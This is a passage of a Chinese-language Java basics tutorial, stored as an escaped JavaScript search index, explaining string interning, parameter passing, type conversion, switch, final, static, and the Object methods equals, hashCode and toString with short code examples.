\u5F53\u4E00\u4E2A\u5B57\u7B26\u4E32\u8C03\u7528 intern() \u65B9\u6CD5\u65F6\uFF0C\u5982\u679C String Pool \u4E2D\u5DF2\u7ECF\u5B58\u5728\u4E00\u4E2A\u5B57\u7B26\u4E32\u548C\u8BE5\u5B57\u7B26\u4E32\u503C\u76F8\u7B49\uFF08\u4F7F\u7528 equals() \u65B9\u6CD5\u8FDB\u884C\u786E\u5B9A\uFF09\uFF0C\u90A3\u4E48\u5C31\u4F1A\u8FD4\u56DE String Pool \u4E2D\u5B57\u7B26\u4E32\u7684\u5F15\u7528\uFF1B\u5426\u5219\uFF0C\u5C31\u4F1A\u5728 String Pool \u4E2D\u6DFB\u52A0\u4E00\u4E2A\u65B0\u7684\u5B57\u7B26\u4E32\uFF0C\u5E76\u8FD4\u56DE\u8FD9\u4E2A\u65B0\u5B57\u7B26\u4E32\u7684\u5F15\u7528\u3002
\u4E0B\u9762\u793A\u4F8B\u4E2D\uFF0Cs1 \u548C s2 \u91C7\u7528 new String() \u7684\u65B9\u5F0F\u65B0\u5EFA\u4E86\u4E24\u4E2A\u4E0D\u540C\u5B57\u7B26\u4E32\uFF0C\u800C s3 \u548C s4 \u662F\u901A\u8FC7 s1.intern() \u548C s2.intern() \u65B9\u6CD5\u53D6\u5F97\u540C\u4E00\u4E2A\u5B57\u7B26\u4E32\u5F15\u7528\u3002intern() \u9996\u5148\u628A "aaa" \u653E\u5230 String Pool \u4E2D\uFF0C\u7136\u540E\u8FD4\u56DE\u8FD9\u4E2A\u5B57\u7B26\u4E32\u5F15\u7528\uFF0C\u56E0\u6B64 s3 \u548C s4 \u5F15\u7528\u7684\u662F\u540C\u4E00\u4E2A\u5B57\u7B26\u4E32\u3002
String s1 = new String("aaa");
String s2 = new String("aaa");
System.out.println(s1 == s2); // false
String s3 = s1.intern();
String s4 = s2.intern();
System.out.println(s3 == s4); // true
\u5982\u679C\u662F\u91C7\u7528 "bbb" \u8FD9\u79CD\u5B57\u9762\u91CF\u7684\u5F62\u5F0F\u521B\u5EFA\u5B57\u7B26\u4E32\uFF0C\u4F1A\u81EA\u52A8\u5730\u5C06\u5B57\u7B26\u4E32\u653E\u5165 String Pool \u4E2D\u3002
String s5 = "bbb";
String s6 = "bbb";
System.out.println(s5 == s6); // true
\u5728 Java 7 \u4E4B\u524D\uFF0CString Pool \u88AB\u653E\u5728\u8FD0\u884C\u65F6\u5E38\u91CF\u6C60\u4E2D\uFF0C\u5B83\u5C5E\u4E8E\u6C38\u4E45\u4EE3\u3002\u800C\u5728 Java 7\uFF0CString Pool \u88AB\u79FB\u5230\u5806\u4E2D\u3002\u8FD9\u662F\u56E0\u4E3A\u6C38\u4E45\u4EE3\u7684\u7A7A\u95F4\u6709\u9650\uFF0C\u5728\u5927\u91CF\u4F7F\u7528\u5B57\u7B26\u4E32\u7684\u573A\u666F\u4E0B\u4F1A\u5BFC\u81F4 OutOfMemoryError \u9519\u8BEF\u3002 StackOverflow : What is String interning?
\u6DF1\u5165\u89E3\u6790 String#intern`},{header:'new String("abc")',slug:"new-string-abc",content:`\u4F7F\u7528\u8FD9\u79CD\u65B9\u5F0F\u4E00\u5171\u4F1A\u521B\u5EFA\u4E24\u4E2A\u5B57\u7B26\u4E32\u5BF9\u8C61\uFF08\u524D\u63D0\u662F String Pool \u4E2D\u8FD8\u6CA1\u6709 "abc" \u5B57\u7B26\u4E32\u5BF9\u8C61\uFF09\u3002 "abc" \u5C5E\u4E8E\u5B57\u7B26\u4E32\u5B57\u9762\u91CF\uFF0C\u56E0\u6B64\u7F16\u8BD1\u65F6\u671F\u4F1A\u5728 String Pool \u4E2D\u521B\u5EFA\u4E00\u4E2A\u5B57\u7B26\u4E32\u5BF9\u8C61\uFF0C\u6307\u5411\u8FD9\u4E2A "abc" \u5B57\u7B26\u4E32\u5B57\u9762\u91CF\uFF1B
\u800C\u4F7F\u7528 new \u7684\u65B9\u5F0F\u4F1A\u5728\u5806\u4E2D\u521B\u5EFA\u4E00\u4E2A\u5B57\u7B26\u4E32\u5BF9\u8C61\u3002 \u521B\u5EFA\u4E00\u4E2A\u6D4B\u8BD5\u7C7B\uFF0C\u5176 main \u65B9\u6CD5\u4E2D\u4F7F\u7528\u8FD9\u79CD\u65B9\u5F0F\u6765\u521B\u5EFA\u5B57\u7B26\u4E32\u5BF9\u8C61\u3002
public class NewStringTest { public static void main(String[] args) { String s = new String("abc"); }
}
\u4F7F\u7528 javap -verbose \u8FDB\u884C\u53CD\u7F16\u8BD1\uFF0C\u5F97\u5230\u4EE5\u4E0B\u5185\u5BB9\uFF1A
// ...
Constant pool:
// ... #2 = Class #18 // java/lang/String #3 = String #19 // abc
// ... #18 = Utf8 java/lang/String #19 = Utf8 abc
// ... public static void main(java.lang.String[]); descriptor: ([Ljava/lang/String;)V flags: ACC_PUBLIC, ACC_STATIC Code: stack=3, locals=2, args_size=1 0: new #2 // class java/lang/String 3: dup 4: ldc #3 // String abc 6: invokespecial #4 // Method java/lang/String."<init>":(Ljava/lang/String;)V 9: astore_1
// ...
\u5728 Constant Pool \u4E2D\uFF0C#19 \u5B58\u50A8\u8FD9\u5B57\u7B26\u4E32\u5B57\u9762\u91CF "abc"\uFF0C#3 \u662F String Pool \u7684\u5B57\u7B26\u4E32\u5BF9\u8C61\uFF0C\u5B83\u6307\u5411 #19 \u8FD9\u4E2A\u5B57\u7B26\u4E32\u5B57\u9762\u91CF\u3002\u5728 main \u65B9\u6CD5\u4E2D\uFF0C0: \u884C\u4F7F\u7528 new #2 \u5728\u5806\u4E2D\u521B\u5EFA\u4E00\u4E2A\u5B57\u7B26\u4E32\u5BF9\u8C61\uFF0C\u5E76\u4E14\u4F7F\u7528 ldc #3 \u5C06 String Pool \u4E2D\u7684\u5B57\u7B26\u4E32\u5BF9\u8C61\u4F5C\u4E3A String \u6784\u9020\u51FD\u6570\u7684\u53C2\u6570\u3002
\u4EE5\u4E0B\u662F String \u6784\u9020\u51FD\u6570\u7684\u6E90\u7801\uFF0C\u53EF\u4EE5\u770B\u5230\uFF0C\u5728\u5C06\u4E00\u4E2A\u5B57\u7B26\u4E32\u5BF9\u8C61\u4F5C\u4E3A\u53E6\u4E00\u4E2A\u5B57\u7B26\u4E32\u5BF9\u8C61\u7684\u6784\u9020\u51FD\u6570\u53C2\u6570\u65F6\uFF0C\u5E76\u4E0D\u4F1A\u5B8C\u5168\u590D\u5236 value \u6570\u7EC4\u5185\u5BB9\uFF0C\u800C\u662F\u90FD\u4F1A\u6307\u5411\u540C\u4E00\u4E2A value \u6570\u7EC4\u3002
public String(String original) { this.value = original.value; this.hash = original.hash;
}`},{header:"\u4E09\u3001\u8FD0\u7B97",slug:"\u4E09\u3001\u8FD0\u7B97",content:""},{header:"\u53C2\u6570\u4F20\u9012",slug:"\u53C2\u6570\u4F20\u9012",content:`Java \u7684\u53C2\u6570\u662F\u4EE5\u503C\u4F20\u9012\u7684\u5F62\u5F0F\u4F20\u5165\u65B9\u6CD5\u4E2D\uFF0C\u800C\u4E0D\u662F\u5F15\u7528\u4F20\u9012\u3002
\u4EE5\u4E0B\u4EE3\u7801\u4E2D Dog dog \u7684 dog \u662F\u4E00\u4E2A\u6307\u9488\uFF0C\u5B58\u50A8\u7684\u662F\u5BF9\u8C61\u7684\u5730\u5740\u3002\u5728\u5C06\u4E00\u4E2A\u53C2\u6570\u4F20\u5165\u4E00\u4E2A\u65B9\u6CD5\u65F6\uFF0C\u672C\u8D28\u4E0A\u662F\u5C06\u5BF9\u8C61\u7684\u5730\u5740\u4EE5\u503C\u7684\u65B9\u5F0F\u4F20\u9012\u5230\u5F62\u53C2\u4E2D\u3002
public class Dog { String name; Dog(String name) { this.name = name; } String getName() { return this.name; } void setName(String name) { this.name = name; } String getObjectAddress() { return super.toString(); }
}
\u5728\u65B9\u6CD5\u4E2D\u6539\u53D8\u5BF9\u8C61\u7684\u5B57\u6BB5\u503C\u4F1A\u6539\u53D8\u539F\u5BF9\u8C61\u8BE5\u5B57\u6BB5\u503C\uFF0C\u56E0\u4E3A\u5F15\u7528\u7684\u662F\u540C\u4E00\u4E2A\u5BF9\u8C61\u3002
class PassByValueExample { public static void main(String[] args) { Dog dog = new Dog("A"); func(dog); System.out.println(dog.getName()); // B } private static void func(Dog dog) { dog.setName("B"); }
}
\u4F46\u662F\u5728\u65B9\u6CD5\u4E2D\u5C06\u6307\u9488\u5F15\u7528\u4E86\u5176\u5B83\u5BF9\u8C61\uFF0C\u90A3\u4E48\u6B64\u65F6\u65B9\u6CD5\u91CC\u548C\u65B9\u6CD5\u5916\u7684\u4E24\u4E2A\u6307\u9488\u6307\u5411\u4E86\u4E0D\u540C\u7684\u5BF9\u8C61\uFF0C\u5728\u4E00\u4E2A\u6307\u9488\u6539\u53D8\u5176\u6240\u6307\u5411\u5BF9\u8C61\u7684\u5185\u5BB9\u5BF9\u53E6\u4E00\u4E2A\u6307\u9488\u6240\u6307\u5411\u7684\u5BF9\u8C61\u6CA1\u6709\u5F71\u54CD\u3002
public class PassByValueExample { public static void main(String[] args) { Dog dog = new Dog("A"); System.out.println(dog.getObjectAddress()); // Dog@4554617c func(dog); System.out.println(dog.getObjectAddress()); // Dog@4554617c System.out.println(dog.getName()); // A } private static void func(Dog dog) { System.out.println(dog.getObjectAddress()); // Dog@4554617c dog = new Dog("B"); System.out.println(dog.getObjectAddress()); // Dog@74a14482 System.out.println(dog.getName()); // B }
}
StackOverflow: Is Java \u201Cpass-by-reference\u201D or \u201Cpass-by-value\u201D?`},{header:"float \u4E0E double",slug:"float-\u4E0E-double",content:`Java \u4E0D\u80FD\u9690\u5F0F\u6267\u884C\u5411\u4E0B\u8F6C\u578B\uFF0C\u56E0\u4E3A\u8FD9\u4F1A\u4F7F\u5F97\u7CBE\u5EA6\u964D\u4F4E\u3002
1.1 \u5B57\u9762\u91CF\u5C5E\u4E8E double \u7C7B\u578B\uFF0C\u4E0D\u80FD\u76F4\u63A5\u5C06 1.1 \u76F4\u63A5\u8D4B\u503C\u7ED9 float \u53D8\u91CF\uFF0C\u56E0\u4E3A\u8FD9\u662F\u5411\u4E0B\u8F6C\u578B\u3002
// float f = 1.1;
1.1f \u5B57\u9762\u91CF\u624D\u662F float \u7C7B\u578B\u3002
float f = 1.1f;`},{header:"\u9690\u5F0F\u7C7B\u578B\u8F6C\u6362",slug:"\u9690\u5F0F\u7C7B\u578B\u8F6C\u6362",content:`\u56E0\u4E3A\u5B57\u9762\u91CF 1 \u662F int \u7C7B\u578B\uFF0C\u5B83\u6BD4 short \u7C7B\u578B\u7CBE\u5EA6\u8981\u9AD8\uFF0C\u56E0\u6B64\u4E0D\u80FD\u9690\u5F0F\u5730\u5C06 int \u7C7B\u578B\u5411\u4E0B\u8F6C\u578B\u4E3A short \u7C7B\u578B\u3002
short s1 = 1;
// s1 = s1 + 1;
\u4F46\u662F\u4F7F\u7528 += \u6216\u8005 ++ \u8FD0\u7B97\u7B26\u4F1A\u6267\u884C\u9690\u5F0F\u7C7B\u578B\u8F6C\u6362\u3002
s1 += 1;
s1++;
\u4E0A\u9762\u7684\u8BED\u53E5\u76F8\u5F53\u4E8E\u5C06 s1 + 1 \u7684\u8BA1\u7B97\u7ED3\u679C\u8FDB\u884C\u4E86\u5411\u4E0B\u8F6C\u578B\uFF1A
s1 = (short) (s1 + 1);
StackOverflow : Why don't Java's +=, -=, *=, /= compound assignment operators require casting?`},{header:"switch",slug:"switch",content:`\u4ECE Java 7 \u5F00\u59CB\uFF0C\u53EF\u4EE5\u5728 switch \u6761\u4EF6\u5224\u65AD\u8BED\u53E5\u4E2D\u4F7F\u7528 String \u5BF9\u8C61\u3002
String s = "a";
switch (s) { case "a": System.out.println("aaa"); break; case "b": System.out.println("bbb"); break;
}
switch \u4E0D\u652F\u6301 long\u3001float\u3001double\uFF0C\u662F\u56E0\u4E3A switch \u7684\u8BBE\u8BA1\u521D\u8877\u662F\u5BF9\u90A3\u4E9B\u53EA\u6709\u5C11\u6570\u51E0\u4E2A\u503C\u7684\u7C7B\u578B\u8FDB\u884C\u7B49\u503C\u5224\u65AD\uFF0C\u5982\u679C\u503C\u8FC7\u4E8E\u590D\u6742\uFF0C\u90A3\u4E48\u8FD8\u662F\u7528 if \u6BD4\u8F83\u5408\u9002\u3002
// long x = 111;
// switch (x) { // Incompatible types. Found: 'long', required: 'char, byte, short, int, Character, Byte, Short, Integer, String, or an enum'
// case 111:
// System.out.println(111);
// break;
// case 222:
// System.out.println(222);
// break;
// }
StackOverflow : Why can't your switch statement data type be long, Java?`},{header:"\u56DB\u3001\u5173\u952E\u5B57",slug:"\u56DB\u3001\u5173\u952E\u5B57",content:""},{header:"final",slug:"final",content:`1. \u6570\u636E
\u58F0\u660E\u6570\u636E\u4E3A\u5E38\u91CF\uFF0C\u53EF\u4EE5\u662F\u7F16\u8BD1\u65F6\u5E38\u91CF\uFF0C\u4E5F\u53EF\u4EE5\u662F\u5728\u8FD0\u884C\u65F6\u88AB\u521D\u59CB\u5316\u540E\u4E0D\u80FD\u88AB\u6539\u53D8\u7684\u5E38\u91CF\u3002 \u5BF9\u4E8E\u57FA\u672C\u7C7B\u578B\uFF0Cfinal \u4F7F\u6570\u503C\u4E0D\u53D8\uFF1B
\u5BF9\u4E8E\u5F15\u7528\u7C7B\u578B\uFF0Cfinal \u4F7F\u5F15\u7528\u4E0D\u53D8\uFF0C\u4E5F\u5C31\u4E0D\u80FD\u5F15\u7528\u5176\u5B83\u5BF9\u8C61\uFF0C\u4F46\u662F\u88AB\u5F15\u7528\u7684\u5BF9\u8C61\u672C\u8EAB\u662F\u53EF\u4EE5\u4FEE\u6539\u7684\u3002 final int x = 1;
// x = 2; // cannot assign value to final variable 'x'
final A y = new A();
y.a = 1;
2. \u65B9\u6CD5
\u58F0\u660E\u65B9\u6CD5\u4E0D\u80FD\u88AB\u5B50\u7C7B\u91CD\u5199\u3002
private \u65B9\u6CD5\u9690\u5F0F\u5730\u88AB\u6307\u5B9A\u4E3A final\uFF0C\u5982\u679C\u5728\u5B50\u7C7B\u4E2D\u5B9A\u4E49\u7684\u65B9\u6CD5\u548C\u57FA\u7C7B\u4E2D\u7684\u4E00\u4E2A private \u65B9\u6CD5\u7B7E\u540D\u76F8\u540C\uFF0C\u6B64\u65F6\u5B50\u7C7B\u7684\u65B9\u6CD5\u4E0D\u662F\u91CD\u5199\u57FA\u7C7B\u65B9\u6CD5\uFF0C\u800C\u662F\u5728\u5B50\u7C7B\u4E2D\u5B9A\u4E49\u4E86\u4E00\u4E2A\u65B0\u7684\u65B9\u6CD5\u3002
3. \u7C7B
\u58F0\u660E\u7C7B\u4E0D\u5141\u8BB8\u88AB\u7EE7\u627F\u3002`},{header:"static",slug:"static",content:`1. \u9759\u6001\u53D8\u91CF \u9759\u6001\u53D8\u91CF\uFF1A\u53C8\u79F0\u4E3A\u7C7B\u53D8\u91CF\uFF0C\u4E5F\u5C31\u662F\u8BF4\u8FD9\u4E2A\u53D8\u91CF\u5C5E\u4E8E\u7C7B\u7684\uFF0C\u7C7B\u6240\u6709\u7684\u5B9E\u4F8B\u90FD\u5171\u4EAB\u9759\u6001\u53D8\u91CF\uFF0C\u53EF\u4EE5\u76F4\u63A5\u901A\u8FC7\u7C7B\u540D\u6765\u8BBF\u95EE\u5B83\u3002\u9759\u6001\u53D8\u91CF\u5728\u5185\u5B58\u4E2D\u53EA\u5B58\u5728\u4E00\u4EFD\u3002
\u5B9E\u4F8B\u53D8\u91CF\uFF1A\u6BCF\u521B\u5EFA\u4E00\u4E2A\u5B9E\u4F8B\u5C31\u4F1A\u4EA7\u751F\u4E00\u4E2A\u5B9E\u4F8B\u53D8\u91CF\uFF0C\u5B83\u4E0E\u8BE5\u5B9E\u4F8B\u540C\u751F\u5171\u6B7B\u3002 public class A { private int x; // \u5B9E\u4F8B\u53D8\u91CF private static int y; // \u9759\u6001\u53D8\u91CF public static void main(String[] args) { // int x = A.x; // Non-static field 'x' cannot be referenced from a static context A a = new A(); int x = a.x; int y = A.y; }
}
2. \u9759\u6001\u65B9\u6CD5
\u9759\u6001\u65B9\u6CD5\u5728\u7C7B\u52A0\u8F7D\u7684\u65F6\u5019\u5C31\u5B58\u5728\u4E86\uFF0C\u5B83\u4E0D\u4F9D\u8D56\u4E8E\u4EFB\u4F55\u5B9E\u4F8B\u3002\u6240\u4EE5\u9759\u6001\u65B9\u6CD5\u5FC5\u987B\u6709\u5B9E\u73B0\uFF0C\u4E5F\u5C31\u662F\u8BF4\u5B83\u4E0D\u80FD\u662F\u62BD\u8C61\u65B9\u6CD5\u3002
public abstract class A { public static void func1(){ } // public abstract static void func2(); // Illegal combination of modifiers: 'abstract' and 'static'
}
\u53EA\u80FD\u8BBF\u95EE\u6240\u5C5E\u7C7B\u7684\u9759\u6001\u5B57\u6BB5\u548C\u9759\u6001\u65B9\u6CD5\uFF0C\u65B9\u6CD5\u4E2D\u4E0D\u80FD\u6709 this \u548C super \u5173\u952E\u5B57\uFF0C\u56E0\u4E3A\u8FD9\u4E24\u4E2A\u5173\u952E\u5B57\u4E0E\u5177\u4F53\u5BF9\u8C61\u5173\u8054\u3002
public class A { private static int x; private int y; public static void func1(){ int a = x; // int b = y; // Non-static field 'y' cannot be referenced from a static context // int b = this.y; // 'A.this' cannot be referenced from a static context }
}
3. \u9759\u6001\u8BED\u53E5\u5757
\u9759\u6001\u8BED\u53E5\u5757\u5728\u7C7B\u521D\u59CB\u5316\u65F6\u8FD0\u884C\u4E00\u6B21\u3002
public class A { static { System.out.println("123"); } public static void main(String[] args) { A a1 = new A(); A a2 = new A(); }
}
123
4. \u9759\u6001\u5185\u90E8\u7C7B
\u975E\u9759\u6001\u5185\u90E8\u7C7B\u4F9D\u8D56\u4E8E\u5916\u90E8\u7C7B\u7684\u5B9E\u4F8B\uFF0C\u4E5F\u5C31\u662F\u8BF4\u9700\u8981\u5148\u521B\u5EFA\u5916\u90E8\u7C7B\u5B9E\u4F8B\uFF0C\u624D\u80FD\u7528\u8FD9\u4E2A\u5B9E\u4F8B\u53BB\u521B\u5EFA\u975E\u9759\u6001\u5185\u90E8\u7C7B\u3002\u800C\u9759\u6001\u5185\u90E8\u7C7B\u4E0D\u9700\u8981\u3002
public class OuterClass { class InnerClass { } static class StaticInnerClass { } public static void main(String[] args) { // InnerClass innerClass = new InnerClass(); // 'OuterClass.this' cannot be referenced from a static context OuterClass outerClass = new OuterClass(); InnerClass innerClass = outerClass.new InnerClass(); StaticInnerClass staticInnerClass = new StaticInnerClass(); }
}
\u9759\u6001\u5185\u90E8\u7C7B\u4E0D\u80FD\u8BBF\u95EE\u5916\u90E8\u7C7B\u7684\u975E\u9759\u6001\u7684\u53D8\u91CF\u548C\u65B9\u6CD5\u3002
5. \u9759\u6001\u5BFC\u5305
\u5728\u4F7F\u7528\u9759\u6001\u53D8\u91CF\u548C\u65B9\u6CD5\u65F6\u4E0D\u7528\u518D\u6307\u660E ClassName\uFF0C\u4ECE\u800C\u7B80\u5316\u4EE3\u7801\uFF0C\u4F46\u53EF\u8BFB\u6027\u5927\u5927\u964D\u4F4E\u3002
import static com.xxx.ClassName.*
6. \u521D\u59CB\u5316\u987A\u5E8F
\u9759\u6001\u53D8\u91CF\u548C\u9759\u6001\u8BED\u53E5\u5757\u4F18\u5148\u4E8E\u5B9E\u4F8B\u53D8\u91CF\u548C\u666E\u901A\u8BED\u53E5\u5757\uFF0C\u9759\u6001\u53D8\u91CF\u548C\u9759\u6001\u8BED\u53E5\u5757\u7684\u521D\u59CB\u5316\u987A\u5E8F\u53D6\u51B3\u4E8E\u5B83\u4EEC\u5728\u4EE3\u7801\u4E2D\u7684\u987A\u5E8F\u3002
public static String staticField = "\u9759\u6001\u53D8\u91CF";
static { System.out.println("\u9759\u6001\u8BED\u53E5\u5757");
}
public String field = "\u5B9E\u4F8B\u53D8\u91CF";
{ System.out.println("\u666E\u901A\u8BED\u53E5\u5757");
}
\u6700\u540E\u624D\u662F\u6784\u9020\u51FD\u6570\u7684\u521D\u59CB\u5316\u3002
public InitialOrderTest() { System.out.println("\u6784\u9020\u51FD\u6570");
}
\u5B58\u5728\u7EE7\u627F\u7684\u60C5\u51B5\u4E0B\uFF0C\u521D\u59CB\u5316\u987A\u5E8F\u4E3A\uFF1A \u7236\u7C7B\uFF08\u9759\u6001\u53D8\u91CF\u3001\u9759\u6001\u8BED\u53E5\u5757\uFF09
\u5B50\u7C7B\uFF08\u9759\u6001\u53D8\u91CF\u3001\u9759\u6001\u8BED\u53E5\u5757\uFF09
\u7236\u7C7B\uFF08\u5B9E\u4F8B\u53D8\u91CF\u3001\u666E\u901A\u8BED\u53E5\u5757\uFF09
\u7236\u7C7B\uFF08\u6784\u9020\u51FD\u6570\uFF09
\u5B50\u7C7B\uFF08\u5B9E\u4F8B\u53D8\u91CF\u3001\u666E\u901A\u8BED\u53E5\u5757\uFF09
\u5B50\u7C7B\uFF08\u6784\u9020\u51FD\u6570\uFF09`},{header:"\u4E94\u3001Object \u901A\u7528\u65B9\u6CD5",slug:"\u4E94\u3001object-\u901A\u7528\u65B9\u6CD5",content:""},{header:"\u6982\u89C8",slug:"\u6982\u89C8-1",content:"public native int hashCode() public boolean equals(Object obj) protected native Object clone() throws CloneNotSupportedException public String toString() public final native Class<?> getClass() protected void finalize() throws Throwable {} public final native void notify() public final native void notifyAll() public final native void wait(long timeout) throws InterruptedException public final void wait(long timeout, int nanos) throws InterruptedException public final void wait() throws InterruptedException"},{header:"equals()",slug:"equals",content:`1. \u7B49\u4EF7\u5173\u7CFB
\u4E24\u4E2A\u5BF9\u8C61\u5177\u6709\u7B49\u4EF7\u5173\u7CFB\uFF0C\u9700\u8981\u6EE1\u8DB3\u4EE5\u4E0B\u4E94\u4E2A\u6761\u4EF6\uFF1A
\u2160 \u81EA\u53CD\u6027
x.equals(x); // true
\u2161 \u5BF9\u79F0\u6027
x.equals(y) == y.equals(x); // true
\u2162 \u4F20\u9012\u6027
if (x.equals(y) && y.equals(z)) x.equals(z); // true;
\u2163 \u4E00\u81F4\u6027
\u591A\u6B21\u8C03\u7528 equals() \u65B9\u6CD5\u7ED3\u679C\u4E0D\u53D8
x.equals(y) == x.equals(y); // true
\u2164 \u4E0E null \u7684\u6BD4\u8F83
\u5BF9\u4EFB\u4F55\u4E0D\u662F null \u7684\u5BF9\u8C61 x \u8C03\u7528 x.equals(null) \u7ED3\u679C\u90FD\u4E3A false
x.equals(null); // false;
2. \u7B49\u4EF7\u4E0E\u76F8\u7B49 \u5BF9\u4E8E\u57FA\u672C\u7C7B\u578B\uFF0C== \u5224\u65AD\u4E24\u4E2A\u503C\u662F\u5426\u76F8\u7B49\uFF0C\u57FA\u672C\u7C7B\u578B\u6CA1\u6709 equals() \u65B9\u6CD5\u3002
\u5BF9\u4E8E\u5F15\u7528\u7C7B\u578B\uFF0C== \u5224\u65AD\u4E24\u4E2A\u53D8\u91CF\u662F\u5426\u5F15\u7528\u540C\u4E00\u4E2A\u5BF9\u8C61\uFF0C\u800C equals() \u5224\u65AD\u5F15\u7528\u7684\u5BF9\u8C61\u662F\u5426\u7B49\u4EF7\u3002 Integer x = new Integer(1);
Integer y = new Integer(1);
System.out.println(x.equals(y)); // true
System.out.println(x == y); // false
3. \u5B9E\u73B0 \u68C0\u67E5\u662F\u5426\u4E3A\u540C\u4E00\u4E2A\u5BF9\u8C61\u7684\u5F15\u7528\uFF0C\u5982\u679C\u662F\u76F4\u63A5\u8FD4\u56DE true\uFF1B
\u68C0\u67E5\u662F\u5426\u662F\u540C\u4E00\u4E2A\u7C7B\u578B\uFF0C\u5982\u679C\u4E0D\u662F\uFF0C\u76F4\u63A5\u8FD4\u56DE false\uFF1B
\u5C06 Object \u5BF9\u8C61\u8FDB\u884C\u8F6C\u578B\uFF1B
\u5224\u65AD\u6BCF\u4E2A\u5173\u952E\u57DF\u662F\u5426\u76F8\u7B49\u3002 public class EqualExample { private int x; private int y; private int z; public EqualExample(int x, int y, int z) { this.x = x; this.y = y; this.z = z; } @Override public boolean equals(Object o) { if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; EqualExample that = (EqualExample) o; if (x != that.x) return false; if (y != that.y) return false; return z == that.z; }
}`},{header:"hashCode()",slug:"hashcode",content:`hashCode() \u8FD4\u56DE\u54C8\u5E0C\u503C\uFF0C\u800C equals() \u662F\u7528\u6765\u5224\u65AD\u4E24\u4E2A\u5BF9\u8C61\u662F\u5426\u7B49\u4EF7\u3002\u7B49\u4EF7\u7684\u4E24\u4E2A\u5BF9\u8C61\u6563\u5217\u503C\u4E00\u5B9A\u76F8\u540C\uFF0C\u4F46\u662F\u6563\u5217\u503C\u76F8\u540C\u7684\u4E24\u4E2A\u5BF9\u8C61\u4E0D\u4E00\u5B9A\u7B49\u4EF7\uFF0C\u8FD9\u662F\u56E0\u4E3A\u8BA1\u7B97\u54C8\u5E0C\u503C\u5177\u6709\u968F\u673A\u6027\uFF0C\u4E24\u4E2A\u503C\u4E0D\u540C\u7684\u5BF9\u8C61\u53EF\u80FD\u8BA1\u7B97\u51FA\u76F8\u540C\u7684\u54C8\u5E0C\u503C\u3002
\u5728\u8986\u76D6 equals() \u65B9\u6CD5\u65F6\u5E94\u5F53\u603B\u662F\u8986\u76D6 hashCode() \u65B9\u6CD5\uFF0C\u4FDD\u8BC1\u7B49\u4EF7\u7684\u4E24\u4E2A\u5BF9\u8C61\u54C8\u5E0C\u503C\u4E5F\u76F8\u7B49\u3002
HashSet \u548C HashMap \u7B49\u96C6\u5408\u7C7B\u4F7F\u7528\u4E86 hashCode() \u65B9\u6CD5\u6765\u8BA1\u7B97\u5BF9\u8C61\u5E94\u8BE5\u5B58\u50A8\u7684\u4F4D\u7F6E\uFF0C\u56E0\u6B64\u8981\u5C06\u5BF9\u8C61\u6DFB\u52A0\u5230\u8FD9\u4E9B\u96C6\u5408\u7C7B\u4E2D\uFF0C\u9700\u8981\u8BA9\u5BF9\u5E94\u7684\u7C7B\u5B9E\u73B0 hashCode() \u65B9\u6CD5\u3002
\u4E0B\u9762\u7684\u4EE3\u7801\u4E2D\uFF0C\u65B0\u5EFA\u4E86\u4E24\u4E2A\u7B49\u4EF7\u7684\u5BF9\u8C61\uFF0C\u5E76\u5C06\u5B83\u4EEC\u6DFB\u52A0\u5230 HashSet \u4E2D\u3002\u6211\u4EEC\u5E0C\u671B\u5C06\u8FD9\u4E24\u4E2A\u5BF9\u8C61\u5F53\u6210\u4E00\u6837\u7684\uFF0C\u53EA\u5728\u96C6\u5408\u4E2D\u6DFB\u52A0\u4E00\u4E2A\u5BF9\u8C61\u3002\u4F46\u662F EqualExample \u6CA1\u6709\u5B9E\u73B0 hashCode() \u65B9\u6CD5\uFF0C\u56E0\u6B64\u8FD9\u4E24\u4E2A\u5BF9\u8C61\u7684\u54C8\u5E0C\u503C\u662F\u4E0D\u540C\u7684\uFF0C\u6700\u7EC8\u5BFC\u81F4\u96C6\u5408\u6DFB\u52A0\u4E86\u4E24\u4E2A\u7B49\u4EF7\u7684\u5BF9\u8C61\u3002
EqualExample e1 = new EqualExample(1, 1, 1);
EqualExample e2 = new EqualExample(1, 1, 1);
System.out.println(e1.equals(e2)); // true
HashSet<EqualExample> set = new HashSet<>();
set.add(e1);
set.add(e2);
System.out.println(set.size()); // 2
\u7406\u60F3\u7684\u54C8\u5E0C\u51FD\u6570\u5E94\u5F53\u5177\u6709\u5747\u5300\u6027\uFF0C\u5373\u4E0D\u76F8\u7B49\u7684\u5BF9\u8C61\u5E94\u5F53\u5747\u5300\u5206\u5E03\u5230\u6240\u6709\u53EF\u80FD\u7684\u54C8\u5E0C\u503C\u4E0A\u3002\u8FD9\u5C31\u8981\u6C42\u4E86\u54C8\u5E0C\u51FD\u6570\u8981\u628A\u6240\u6709\u57DF\u7684\u503C\u90FD\u8003\u8651\u8FDB\u6765\u3002\u53EF\u4EE5\u5C06\u6BCF\u4E2A\u57DF\u90FD\u5F53\u6210 R \u8FDB\u5236\u7684\u67D0\u4E00\u4F4D\uFF0C\u7136\u540E\u7EC4\u6210\u4E00\u4E2A R \u8FDB\u5236\u7684\u6574\u6570\u3002
R \u4E00\u822C\u53D6 31\uFF0C\u56E0\u4E3A\u5B83\u662F\u4E00\u4E2A\u5947\u7D20\u6570\uFF0C\u5982\u679C\u662F\u5076\u6570\u7684\u8BDD\uFF0C\u5F53\u51FA\u73B0\u4E58\u6CD5\u6EA2\u51FA\uFF0C\u4FE1\u606F\u5C31\u4F1A\u4E22\u5931\uFF0C\u56E0\u4E3A\u4E0E 2 \u76F8\u4E58\u76F8\u5F53\u4E8E\u5411\u5DE6\u79FB\u4E00\u4F4D\uFF0C\u6700\u5DE6\u8FB9\u7684\u4F4D\u4E22\u5931\u3002\u5E76\u4E14\u4E00\u4E2A\u6570\u4E0E 31 \u76F8\u4E58\u53EF\u4EE5\u8F6C\u6362\u6210\u79FB\u4F4D\u548C\u51CF\u6CD5\uFF1A31*x == (x<<5)-x\uFF0C\u7F16\u8BD1\u5668\u4F1A\u81EA\u52A8\u8FDB\u884C\u8FD9\u4E2A\u4F18\u5316\u3002
@Override
public int hashCode() { int result = 17; result = 31 * result + x; result = 31 * result + y; result = 31 * result + z; return result;
}`},{header:"toString()",slug:"tostring",content:`\u9ED8\u8BA4\u8FD4\u56DE ToStringExample@4554617c \u8FD9\u79CD\u5F62\u5F0F\uFF0C\u5176\u4E2D @ \u540E\u9762\u7684\u6570\u503C\u4E3A\u6563\u5217\u7801\u7684\u65E0\u7B26\u53F7\u5341\u516D\u8FDB\u5236\u8868\u793A\u3002
public class ToStringExample { private int number; public ToStringExample(int number) { this.number = number; }
}
ToStringExample example = new ToStringExample(123);
